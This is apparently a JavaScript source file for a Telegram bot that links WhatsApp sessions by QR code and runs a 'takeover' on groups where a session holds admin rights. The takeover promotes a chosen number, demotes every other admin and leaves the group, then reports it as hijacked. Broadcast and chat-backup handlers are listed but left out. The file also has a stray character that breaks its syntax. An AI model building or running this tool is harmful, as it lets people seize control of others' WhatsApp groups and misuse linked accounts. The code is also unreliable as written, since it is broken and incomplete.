require('dotenv').config();
const { default: makeWASocket, useSingleFileAuthState } = require('@adiwajshing/baileys');
const { Telegraf, Markup } = require('telegraf');
const qrcode = require('qrcode-terminal');
const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const OWNER_ID       = Number(process.env.OWNER_ID);
const MENU_IMAGE     = 'https://files.catbox.moe/jnw3mo.jpeg';

// Paths
const SESSIONS_DIR = process.env.SESSIONS_DIR || path.join(__dirname, 'sessions');
const ALLOWED_FILE = path.join(__dirname, 'allowed.json');
const INFO_FILE    = path.join(__dirname, 'info.json');

// Ensure storage files/directories
fs.ensureDirSync(SESSIONS_DIR);
if (!fs.existsSync(ALLOWED_FILE)) fs.writeJsonSync(ALLOWED_FILE, [ OWNER_ID ]);
if (!fs.existsSync(INFO_FILE))    fs.writeJsonSync(INFO_FILE, []);

// In-memory trackers
const sessionState   = {};  // pairingCode → { sock, owner }
const pendingTarget  = {};  // for takeover & broadcast flows
const profileUploads = {};  // for change-profile flow

// — Helpers —
function loadAllowed() {
  return fs.readJsonSync(ALLOWED_FILE);
}
function saveAllowed(list) {
  fs.writeJsonSync(ALLOWED_FILE, list);
}
function genCode() {
  return crypto.randomBytes(4).toString('hex').toUpperCase();
}
function fancy(text) {
  return text.split('').map(ch => {
    const code = ch.charCodeAt(0);
    if (65 <= code && code <= 90)    // A–Z
      return String.fromCodePoint(0x1D400 + (code - 65));
    if (97 <= code && code <= 122)   // a–z
      return String.fromCodePoint(0x1D41A + (code - 97));
    return ch;
  }).join('');
}

// — Record session info —
function recordSessionInfo(code, ownerId) {
  const info = fs.readJsonSync(INFO_FILE);
  info.push({
    code,
    owner: ownerId,
    createdAt: new Date().toISOString()
  });
  fs.writeJsonSync(INFO_FILE, info);
}

// — Create & pair a new WhatsApp session —
async function createSession(ctx) {
  const pairingCode = genCode();
  const file        = path.join(SESSIONS_DIR, `${pairingCode}.json`);
  const { state, saveState } = useSingleFileAuthState(file);
  const sock       = makeWASocket({ auth: state, printQRInTerminal: false });

  sock.ev.on('connection.update', update => {
    if (update.qr) {
      qrcode.generate(update.qr, { small: true }, qr =>
        ctx.replyWithPhoto(
          { source: Buffer.from(qr) },
          { caption: `🔗 *Code:* \`${pairingCode}\`\nScan within 1 min`, parse_mode:'Markdown' }
        )
      );
    }
    if (update.connection === 'open') {
      saveState();
      sessionState[pairingCode] = { sock, owner: ctx.from.id };
      // record into info.json
      recordSessionInfo(pairingCode, ctx.from.id);
      ctx.reply(`✅ *Session ${pairingCode}* connected!`, { parse_mode:'Markdown' });
      sendMainMenu(ctx);
    }
  });

  sock.ev.on('creds.update', saveState);
}

// — Send the stylized image menu —
function sendMainMenu(ctx) {
  const allowed = loadAllowed();
  if (!allowed.includes(ctx.from.id)) {
    return ctx.reply(fancy('⛔ You are not allowed yet. Ask the owner to `/allow` you.'));
  }

  const rows = [
    [ Markup.button.callback(fancy('📱 Pair New Session'),    'BTN_PAIR') ],
    [ Markup.button.callback(fancy('🔄 List Sessions'),       'BTN_LIST') ],
    [ Markup.button.callback(fancy('👥 Takeover Group'),      'BTN_TAKEOVER') ],
    [ Markup.button.callback(fancy('🗂️ List Groups'),         'BTN_LISTGRP') ],
    [ Markup.button.callback(fancy('🚪 End Session'),         'BTN_END') ],
    [ Markup.button.callback(fancy('📢 Broadcast'),           'BTN_BCAST') ],
    [ Markup.button.callback(fancy('📑 Group Info'),          'BTN_INFO') ],
    [ Markup.button.callback(fancy('🚶 Leave All Groups'),    'BTN_LEAVEALL') ],
    [ Markup.button.callback(fancy('🔄 Change Profile Pic'),  'BTN_CHPROF') ],
    [ Markup.button.callback(fancy('📝 Backup Chats'),         'BTN_BACKUP') ],
  ];

  ctx.replyWithPhoto(
    { url: MENU_IMAGE },
    {
      caption: fancy('🌌 *THE OMNICELESTIAL Control Panel*'),
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard(rows)
    }
  );
}

// — Bot setup —
const bot = new Telegraf(TELEGRAM_TOKEN);

// Middleware: allow only OWNER or approved users
bot.use((ctx, next) => {
  const allowed = loadAllowed();
  if (ctx.from.id === OWNER_ID) return next();h
  if (!allowed.includes(ctx.from.id)) {
    return ctx.reply(fancy('⛔ You’re not approved. Ask the owner.'));
  }
  return next();
});

// Commands
bot.start(sendMainMenu);
bot.command('menu', sendMainMenu);

bot.command('allow', ctx => {
  if (ctx.from.id !== OWNER_ID) return;
  const id = Number(ctx.message.text.split(/\s+/)[1]);
  if (!id) return ctx.reply('Usage: /allow <telegramId>');
  const list = loadAllowed();
  if (!list.includes(id)) {
    list.push(id);
    saveAllowed(list);
    ctx.reply('✅ Allowed');
  } else {
    ctx.reply('✅ Already allowed');
  }
});
bot.command('disallow', ctx => {
  if (ctx.from.id !== OWNER_ID) return;
  const id = Number(ctx.message.text.split(/\s+/)[1]);
  let list = loadAllowed();
  list = list.filter(x => x !== id);
  saveAllowed(list);
  ctx.reply('❌ Disallowed');
});

// Button handlers — Pair
bot.action('BTN_PAIR', async ctx => {
  ctx.answerCbQuery();
  await createSession(ctx);
});

// List Sessions
bot.action('BTN_LIST', ctx => {
  ctx.answerCbQuery();
  const yours = Object.entries(sessionState)
    .filter(([, s]) => s.owner === ctx.from.id)
    .map(([c]) => c);
  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
  ctx.reply(fancy('📋 Your sessions:\n') + yours.map(c => `• ${c}`).join('\n'));
});

// Takeover Group
bot.action('BTN_TAKEOVER', async ctx => {
  ctx.answerCbQuery();
  const yours = Object.entries(sessionState)
    .filter(([, s]) => s.owner === ctx.from.id)
    .map(([c]) => c);
  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
  const rows = yours.map(code => [ Markup.button.callback(fancy(code), `TO_${code}`) ]);
  ctx.reply(fancy('🎯 Choose session:'), Markup.inlineKeyboard(rows));
});
bot.action(/^TO_(.+)$/, async ctx => {
  ctx.answerCbQuery();
  const code = ctx.match[1], entry = sessionState[code];
  if (!entry) return ctx.reply(fancy('❌ Invalid session.'));
  const sock = entry.sock;
  const all  = await sock.groupFetchAllParticipating();
  const groups = Object.entries(all)
    .filter(([, m]) => m.participants.some(p => p.id === sock.user.id && p.admin))
    .map(([gid, m]) => ({ gid, name: m.subject }));
  if (!groups.length) return ctx.reply(fancy('⚠️ No admin groups.'));
  const rows = groups.map(g => [ Markup.button.callback(fancy(g.name), `SEL_${code}_${g.gid}`) ]);
  ctx.reply(fancy('📋 Pick a group:'), Markup.inlineKeyboard(rows));
});
bot.action(/^SEL_(.+)_(.+)$/, async ctx => {
  ctx.answerCbQuery();
  pendingTarget[ctx.from.id] = { code: ctx.match[1], groupId: ctx.match[2] };
  ctx.reply(fancy('✉️ Send target number (e.g. 2348012345678):'));
});
bot.on('text', async ctx => {
  const pend = pendingTarget[ctx.from.id];
  if (!pend) return;
  delete pendingTarget[ctx.from.id];

  const { code, groupId } = pend;
  const entry = sessionState[code];
  if (!entry) return ctx.reply(fancy('❌ Session gone.'));
  const sock = entry.sock;
  const targetJid = ctx.message.text.trim() + '@s.whatsapp.net';

  await ctx.reply(fancy('🚀 Executing takeover…'));
  const meta = (await sock.groupFetchAllParticipating())[groupId];
  const parts = meta.participants.map(p => p.id);

  await sock.groupParticipantsUpdate(groupId, [ targetJid ], 'promote');
  const others = parts.filter(id => id !== targetJid && id !== sock.user.id);
  if (others.length) {
    await sock.groupParticipantsUpdate(groupId, others, 'demote');
  }
  await sock.groupLeave(groupId);

  ctx.reply(fancy(`✅ *${meta.subject}* hijacked.`));
});

// [Other handlers: List Groups, End Session, Broadcast, Group Info, Leave All, Change Profile, Backup Chats]
// ... (same as above, omitted for brevity; integrate them as shown previously)

bot.launch();
process.once('SIGINT', () => bot.stop());
process.once('SIGTERM', () => bot.stop());
